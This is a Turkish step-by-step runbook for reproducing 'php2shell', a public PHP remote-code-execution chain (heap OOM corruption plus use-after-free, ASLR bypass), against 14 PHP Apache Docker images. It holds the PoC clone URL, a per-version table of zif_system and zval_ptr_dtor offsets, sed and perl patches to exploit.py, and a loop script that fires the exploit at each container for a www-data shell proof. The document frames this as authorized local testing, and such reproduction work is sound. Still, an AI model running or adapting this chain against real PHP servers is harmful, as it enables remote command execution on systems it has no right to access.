# php2shell — Native amd64 `id` kaniti (Windows x86_64 + WSL2 + Docker)

> Bu rehber **kendi kendine yeter** — baska bir ajana / kisiye verilebilir.
> Amac: Windows x86_64 makinede **native amd64** PHP kurup, php2shell
> (CVE-2026-109618 OOM corruption + CVE-2026-109619 stale-global UAF) exploit'ini
> calistirip **her surumun `id` (www-data) kanitini** almak.
> **Yetkili guvenlik arastirmasi** — hedef: kullaniciya ait / yetkili sistem + acik kaynak PHP core.
> Amac: aciklarin calistigini GOSTERMEK + raporlama. Saldiri DEGIL.

---

## 0) Neden native amd64 (ve neden WSL2)?

| ortam | sonuc | neden |
|---|---|---|
| macOS + colima + **qemu-x86_64** (amd64 emulasyon) | ❌ leak yok → id yok | qemu-user syscall emulasyonu glibc heap timing+layout'ini bozar; A1 OOM dangling pointer birakmiyor |
| Windows x86_64 + **WSL2** (native amd64) | ✅ **calisir** | WSL2 = gercek Linux kernel (Hyper-V VM), native amd64, emulasyon YOK → exploit aynen calisir |
| Windows native PHP (WSL'siz) | ⚠️ port | Windows heap (ntdll) glibc degil → offset + heap-shape yeniden tune gerekir |

**Sonuc:** Windows x86_64 makinede **WSL2 + Docker** = en temiz yol (exploit'i aynen calistirir, re-tune yok).

---

## 1) On gereksinim

- **Windows 10/11 x86_64** (Snapdragon/ARM64 DEGIL — `winver` ile dogrula)
- **Virtualization** (BIOS'ta; WSL2 icin) — `systeminfo | findstr /i hypervisor`
- **Internet** (image + package indirme)
- ~15 GB bos disk

---

## 2) ADIM — WSL2 + Docker kur

### 2a) WSL2 (PowerShell, **Admin**)
```powershell
# WSL2 kur (Ubuntu default; restart ister)
wsl --install
# makineyi restart et
# WSL2 varsayilan + surumu dogrula
wsl --set-default-version 2
wsl -l -v          # VERSION = 2 olmali
wsl --version
```

### 2b) Docker Desktop (WSL2 backend)
- **Indir:** https://www.docker.com/products/docker-desktop/
- Kurulumda **"Use WSL 2 instead of Hyper-V"** secili olsun.
- *Settings → Resources → WSL Integration* → Ubuntu'yu etkinlestir.
- Dogrula (WSL'de):
```bash
docker version        # Server: Docker Desktop, WSL 2 based
docker run --rm --platform linux/amd64 hello-world
```

> Not: WSL2, x86_64 Windows makinesinde **native amd64** kernel calistirir → amd64 konteyner
> **qemu emulasyonundan GECMEZ**. Bu, exploit'in calistigi tam ortam.

---

## 3) ADIM — PHP image'larini cek (native amd64)

> Hepsi `linux/amd64` — WSL2 native amd64'ta aynen calisir.
> (Bu hostta containerd v2.1, 5.4/5.5'in eski manifest-v1'ini inemiyor; WSL2/standart Docker'da inilebilir.)

```bash
# baseline + hedef (once bu ikisi)
docker pull --platform linux/amd64 php:8.4.26-apache
docker pull --platform linux/amd64 php:8.2.34-apache

# tam 5.4→8.5 kapsami (14 surum)
docker pull --platform linux/amd64 php:5.4.45-apache
docker pull --platform linux/amd64 php:5.5.38-apache
docker pull --platform linux/amd64 php:5.6.40-apache
docker pull --platform linux/amd64 php:7.0.33-apache
docker pull --platform linux/amd64 php:7.1.33-apache
docker pull --platform linux/amd64 php:7.2.34-apache
docker pull --platform linux/amd64 php:7.3.33-apache
docker pull --platform linux/amd64 php:7.4.33-apache
docker pull --platform linux/amd64 php:8.0.30-apache   # 8.0.30 yoksa php:8.0-apache
docker pull --platform linux/amd64 php:8.1.32-apache
docker pull --platform linux/amd64 php:8.2.34-apache
docker pull --platform linux/amd64 php:8.3.35-apache
docker pull --platform linux/amd64 php:8.4.26-apache
docker pull --platform linux/amd64 php:8.5.11-apache
```

**Image'lari indirmeden tasima (istege bagli):** kaynak makinede
`docker save php:8.4.26-apache php:8.2.34-apache > p2s.tar` → bu makineye kopyala →
`docker load < p2s.tar`. (Ayrinti: §7)

---

## 4) ADIM — 9bie PoC'i kur (hedefte)

PoC dosyalari (hepsi gerekli):
```
php2shell-bypass-aslr-exp/
├── exploit.py            # ana zincir (A1→B1→A2→B2)
└── pure/
    ├── chunked_send.py   # chunked HTTP gonderici
    ├── mk_a1.py          # A1: END-cleanup send_cookie OOM
    ├── mk_leak_b.py      # B1: stale-id OOB read (leak)
    ├── cheap_oom_a.py    # A2: cheap-OOM → dangling PS(http_session_vars)
    ├── mk_ht.py          # B2: fake zend_array (pDestructor=zif_system)
    └── fake_ref_b.py     # B2: fake reference
```

**Kaynak (ikisi de ayni):**
- **Public GitHub:** `https://github.com/9bie/php2shell-bypass-aslr-exp.git`
  ```bash
  git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
  cd php2shell-bypass-aslr-exp
  ```
- **Yoksa** (kullanicinin kalibre kopyasi): `labs/nine-bie/{exploit.py,pure/}` klasorunu
  bu makineye kopyala (SMB / USB / scp).

---

## 5) ADIM — Surum + offset tablosu (amd64)

`exploit.py` icinde **surume gore** 2 satir degisir (baseline 8.4.26 varsayilan):

| Surum | `zif_system` | `zval_ptr_dtor` | `exploit.py` satir |
|---|---|---|---|
| **8.4.26 (BASELINE)** | `0x465370` | `0x65EB60` | varsayilan (degistirme) |
| 8.5.11 | `0x5996e0` | `0x7b47a0` | `0x65EB60`→`0x7b47a0`, `0x465370`→`0x5996e0` |
| 8.3.35 | `0x3ac080` | `0x49ec50` | ayni ikili |
| 8.2.34 | `0x39b8a0` | `0x487650` | ayni ikili |
| 8.1.32 | `0x36b080` | `0x450690` | ayni ikili |
| 8.0.30 | `0x3495d0` | `0x4319a0` | ayni ikili |
| 7.4.33 | `0x335850` | `0x417d60` | ayni ikili |
| 7.3.33 | `0x35f640` | `0x440dc0` | ayni ikili |
| 7.2.34 | `0x3624e0` | `0x441b20` | ayni ikili |
| 7.1.33 | `0x300420` | `0x3d7ce0` | ayni ikili |
| 7.0.33 | `0x3948d0` | `0x46c790` | ayni ikili |
| 5.6.40 | `0x378e80` | `0x456710` | ayni ikili |

> **Offset'i dogrula (guvenli):** her konteynerin `libphp.so`'sundan kendin olc —
> `docker run --rm -v $PWD:/w <img> sh -c 'find / -name libphp*.so'` → `nm libphp.so | grep -E "zif_system|zval_ptr_dtor"`.
> `exploit.py`: satir `lib = zdtor - <DTOR>` ve `zif = lib + <ZIF>`.

**`exploit.py`'de offset degisimi (her surum icin):**
```bash
# or. 8.2.34 (DTOR=0x487650, ZIF=0x39b8a0)
sed -i 's/0x65EB60/0x487650/; s/0x465370/0x39b8a0/' exploit.py
```

---

## 6) ADIM — Her surum icin `id` calistir

### 6a) Tek surum (baseline 8.4.26)
```bash
# 1) target'i native amd64'ta baslat (WSL2'de, qemu YOK)
docker run -d --name p2s84 -p 18120:80 php:8.4.26-apache
# target sayfasi sadece <?php echo "OK\n"; ?> — resmî image zaten oyle
curl -s http://127.0.0.1:18120/index.php    # -> OK

# 2) exploit (offsetler baseline = varsayilan)
python3 exploit.py --port 18120 --cmd 'id>/out/p1' --proof ./out/p1

# 3) KANIT
cat out/p1          # -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 6b) Tum 14 surum (ozel `run_all.sh`)
```bash
#!/usr/bin/env bash
# her surum: offset'i set et -> konteyner -> exploit -> id'yi topla
declare -A ZIF=( [8.4.26]=0x465370 [8.5.11]=0x5996e0 [8.3.35]=0x3ac080 [8.2.34]=0x39b8a0 \
  [8.1.32]=0x36b080 [8.0.30]=0x3495d0 [7.4.33]=0x335850 [7.3.33]=0x35f640 \
  [7.2.34]=0x3624e0 [7.1.33]=0x300420 [7.0.33]=0x3948d0 [5.6.40]=0x378e80 )
declare -A DTOR=( [8.4.26]=0x65EB60 [8.5.11]=0x7b47a0 [8.3.35]=0x49ec50 [8.2.34]=0x487650 \
  [8.1.32]=0x450690 [8.0.30]=0x4319a0 [7.4.33]=0x417d60 [7.3.33]=0x440dc0 \
  [7.2.34]=0x441b20 [7.1.33]=0x3d7ce0 [7.0.33]=0x46c790 [5.6.40]=0x456710 )

for v in 8.4.26 8.5.11 8.3.35 8.2.34 8.1.32 8.0.30 7.4.33 7.3.33 7.2.34 7.1.33 7.0.33 5.6.40; do
  port=$((18100 + ${v//./} % 1000))
  sed -i "s/0x[0-9A-Fa-f]\{4,6\} *$/PLACEHOLDER/" exploit.py 2>/dev/null
  # baseline offset'leri bu surume ayarla (2 satir)
  perl -0pi -e "s/zdtor - 0x[0-9A-Fa-f]+/zdtor - ${DTOR[$v]}/; s/lib\] \+ 0x[0-9A-Fa-f]+/lib\] + ${ZIF[$v]}/" exploit.py
  docker rm -f p2s$port >/dev/null 2>&1
  docker run -d --name p2s$port -p $port:80 php:${v}-apache >/dev/null
  sleep 1
  python3 exploit.py --port $port --cmd 'id>/out/p1' --proof ./out_${v}_p1
  [ -s ./out_${v}_p1 ] && echo "[$v] ID: $(cat ./out_${v}_p1)" || echo "[$v] YOK — retry"
done
# 5.4.45 / 5.5.38: manifest-v1 sorunlu ise kaynak derleme veya ayna (bkz. §7)
```

> **Tekrar:** exploit probabilistik (heap-shape). Basarisizsa ayni target'a birkac kez dene
> (worker restart olur, guvenli). `--retries 5` artir.

---

## 7) Indirme baglantilari

| Ne | Link |
|---|---|
| **Docker Desktop** (WSL2 backend) | https://www.docker.com/products/docker-desktop/ |
| **WSL2** | Windows built-in — `wsl --install` (https://aka.ms/wslinstall) |
| **PHP image'lari** (Docker Hub) | `docker pull --platform linux/amd64 php:<ver>-apache` (https://hub.docker.com/_/php) |
| **9bie PoC** (public) | https://github.com/9bie/php2shell-bypass-aslr-exp.git |
| **PHP kaynak** (5.4/5.5 manifest-v1 yedegi) | https://www.php.net/distributions/ |
| **Docker Hub (5.4/5.5 aynasi, manifest-v2)** | https://hub.docker.com (tag: `5.4`/`5.5`) veya ayna |

---

## 8) Dogrulama checklist (her surum)

- [ ] `wsl -l -v` → VERSION 2
- [ ] `docker run --rm --platform linux/amd64 php:8.4.26-apache php -v` → `PHP 8.4.26`
- [ ] `curl http://127.0.0.1:<port>/index.php` → `OK`
- [ ] `exploit.py` → `zval_ptr_dtor=0x... libphp=0x...` leak OK (Set-Cookie heap verisi)
- [ ] `out/p1` → `uid=33(www-data) gid=33(www-data)`  ← **id kaniti**
- [ ] 14 surumun her biri icin `id` toplanmis

**Durust kural:** `out/p1` yoksa = o ortamda tekrarlanamadi → **sahte gosterme**; retry veya native amd64'a gec.
